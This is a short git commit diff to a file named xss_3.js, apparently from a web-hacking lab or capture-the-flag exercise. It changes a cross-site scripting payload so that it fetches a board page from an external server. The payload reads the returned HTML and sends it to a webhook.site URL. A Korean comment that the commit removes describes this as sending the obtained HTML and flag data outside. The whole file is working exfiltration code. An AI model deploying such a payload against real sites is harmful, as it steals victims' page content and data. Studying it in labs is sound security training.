08ade947e3f36420d72f1ae00345aba757f0398a
developer-commit <github.rust@gmail.com>
2026-07-30 07:40:11 +0900

    Update fetch URL to use external server

--- xss_3.js
+++ xss_3.js
@@ -1,7 +1,6 @@
-fetch('/board/0')
+fetch('http://edu.arang.kr:9103/board/0')
   .then(response => response.text())
   .then(html => {
-    // 획득한 HTML 및 Flag 데이터를 외부로 전달
     fetch('https://webhook.site/7c6d8599-2773-4bb4-914b-c33fd36efb97/log?data=' + encodeURIComponent(html));
   })
   .catch(err => console.error(err));
